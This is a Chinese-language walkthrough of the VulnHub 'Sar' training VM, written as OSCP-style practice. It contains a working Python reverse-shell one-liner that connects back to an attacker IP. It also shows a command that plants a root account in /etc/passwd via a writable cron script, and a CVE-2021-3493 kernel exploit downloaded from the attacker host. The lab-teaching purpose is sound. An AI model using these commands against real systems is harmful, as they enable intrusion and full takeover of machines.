---
title: VulnHub Sar 靶机完整渗透测试复现：从 sar2HTML RCE 到 Cron 计划任务与 CVE-2021-3493 双提权路径
description: 详细记录 VulnHub Sar 靶机的完整渗透测试流程：信息收集、sar2HTML 3.2.1 RCE 漏洞利用获取初始 Shell、Flag1
  获取、以及两条截然不同的提权路径——计划任务配置不当写入 /etc/passwd 与 CVE-2021-3493 内核漏洞利用。适合 OSCP 风格实战练习与渗透测试基础巩固。
category: program-analysis
tags:
- VulnHub
- 渗透测试
- sar2HTML
- RCE
- 提权
- Cron
- CVE-2021-3493
- OSCP备考
- 靶机实战
date: 2024-01-15
updated: '2026-11-14'
---

## 靶机概况

| 项目 | 详情 |
|------|------|
| **靶机名称** | Sar |
| **来源** | VulnHub |
| **下载地址** | <https://download.vulnhub.com/sar/sar.zip> |
| **难度** | 低 |
| **部署环境** | VirtualBox |
| **网络模式** | 桥接模式 |
| **定位** | 类 OSCP 风格虚拟靶场，用于巩固渗透测试核心知识点 |

## 信息收集与攻击面枚举

### 主机发现
通过网络扫描定位目标主机 IP（示例环境为 `192.168.31.246`）。

### 端口扫描
全端口扫描结果显示开放 **HTTP (80/tcp)** 服务，为后续 Web 攻击面提供入口。

### Web 服务枚举
- 访问首页获取基础信息
- 目录扫描发现关键文件：
  - `robots.txt`：提示存在 `sar2HTML` 目录
  - `sar2HTML/`：确认版本为 **sar2html Ver 3.2.1**

## 漏洞发现与初始访问：sar2HTML RCE (CVE-2019-???)

### 漏洞确认
使用 `searchsploit sar2html` 检索公开漏洞利用代码，确认该版本存在 **远程代码执行 (RCE)** 漏洞。

```
searchsploit sar2html
```

### 漏洞利用
1. 将 Exploit 脚本复制到本地（文中命名为 `exp`）
2. 无需修改代码，直接指定目标 `sar2HTML` 路径：`http://192.168.31.246/sar2HTML/`
3. 执行脚本建立交互式命令执行通道

### 反弹 Shell
利用 Python 3 单行反弹 Shell 命令连接回攻击机 (Kali)：
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

> **相关实战参考**：[[vulnhub-bbs-cute-102-writeup]] 同样演示了 Web RCE 到反弹 Shell 的标准化流程；[[vulnhub-hard-socnet2-writeup]] 中亦包含 Web 入口利用环节。

## 后渗透与 Flag1 获取

登陆 Shell 后，在 `/home/love/Desktop` 目录下发现 **flag1**，完成第一阶段目标。

## 权限提升路径一：计划任务配置不当 (Cron Job Misconfiguration)

### 发现机制
枚举系统定时任务 (`crontab -l` 或查看 `/etc/crontab` / `/etc/cron.*`)，发现一条以 **root 身份** 定期执行的任务：
```
/var/www/html/finally.sh
```

### 攻击链分析
1. `finally.sh` 脚本内容显示会调用 `write.sh`
2. `write.sh` 文件权限为 **全员可读写执行 (777)**
3. 形成可控写入链：`root cron -> finally.sh -> write.sh (attacker controlled)`

### 利用实施
向 `write.sh` 写入恶意负载，将伪造的 root 账户写入 `/etc/passwd`：
```bash
echo -n 'echo "kali:BzUaXkvkbDOx2:0:0:root:/root:/bin/bash" >> /etc/passwd' > write.sh
```
- `BzUaXkvkbDOx2` 为密码 `123` 经 `openssl passwd` 生成的 DES 哈希
- 等待计划任务触发后，`/etc/passwd` 新增 `kali` 用户，UID/GID=0 即为 root 权限

### 验证
```bash
su kali
# Password: 123
id
# uid=0(root) gid=0(root) groups=0(root)
```

> **同类技术对比**：[[glasgowsmile-vulnhub-writeup]] 同样通过定时任务配置缺陷实现提权；[[vulnhub-infosecprep-oscp-writeup]] 则采用 SUID 二进制滥用路径。

## 权限提升路径二：CVE-2021-3493 内核提权 (Overlayfs 本地提权)

### 漏洞背景
**CVE-2021-3493** 影响 Ubuntu 20.04/20.10 等内核版本，利用 OverlayFS 权限检查绕过实现本地提权。靶机环境预装了对应易受攻击内核。

### 利用条件与准备
- 靶机**无 gcc 编译环境**，无法现场编译 Exploit
- 攻击机 (Kali) 预先编译好 Exploit 二进制文件
- Kali 开启 HTTP 服务 (`python3 -m http.server 8000`)
- 靶机通过 `wget`/`curl` 下载预编译二进制

### 利用执行
```bash
chmod +x exploit
./exploit
```
成功弹出 root Shell，完成第二条提权路径验证。

> **关联实战**：[[vulnhub-hard-socnet2-writeup]] 同靶机复现中亦使用 CVE-2021-3493 作为提权手段之一，可对比不同环境下的利用稳定性与编译依赖处理。

## 总结与知识点梳理

| 阶段 | 核心技术/工具 | 关键点 |
|------|---------------|--------|
| **信息收集** | Nmap, Dirb/Gobuster, robots.txt | 目录枚举发现隐藏应用入口 |
| **漏洞利用** | searchsploit, sar2HTML RCE, Python 反弹 Shell | 公开 Exploit 直接可用，快速建立立足点 |
| **提权路径一** | Cron 任务审计, 文件权限错误配置, /etc/passwd 注入 | 经典「计划任务调用可写脚本」模式，无需内核漏洞 |
| **提权路径二** | CVE-2021-3493 (Overlayfs), 预编译 Exploit 传递 | 内核漏洞利用，应对无编译工具链环境的实战技巧 |

### 实战启示
1. **Web 应用版本识别**配合 `searchsploit` 是快速发现已知漏洞的标准动作
2. **计划任务审计**应成肌肉记忆：`crontab -l`、`ls -la /etc/cron*`、`cat /etc/crontab` 三件套
3. **无编译环境下的内核 Exploit 部署**：预编译 + HTTP 传输是通用解法
4. **双提权路径验证**不仅为拿 Flag，更是对提权思路广度的考察——**配置错误**与**内核漏洞**并行掌握才是 OSCP 风格考核的核心要求

## 交叉引用与延伸阅读

- [[vulnhub-platform-resource-index]] — VulnHub 平台资源总索引，含 750+ 镜像获取方式与现有 Writeup 交叉引用
- [[vulnhub-hard-socnet2-writeup]] — 同平台高难度靶机，同样涉及 CVE-2021-3493 与二进制溢出利用
- [[glasgowsmile-vulnhub-writeup]] — Joomla 爆破入口 + 定时任务提权，对比不同 CMS 场景下的 Cron 滥用模式
- [[vulnhub-infosecprep-oscp-writeup]] — WordPress 枚举 + SSH 私钥 + SUID 提权，另一条 OSCP 风格攻击链
- [[vulnhub-bbs-cute-102-writeup]] — CuteNews RCE + 文件上传绕过，Web 入口利用对比
- [[vulnhub-dawn2-writeup]] — Windows 缓冲区溢出 + Immunity Debugger + msfvenom，跨平台技能延伸
- [[peda-buffer-overflow-analysis-guide]] — PEDA + GDB + ROP 系统化教程，夯实二进制利用底座

## 来源

- [0x00实验室-202108-202304_024](../sources/0x00实验室-202108-202304_024.md)
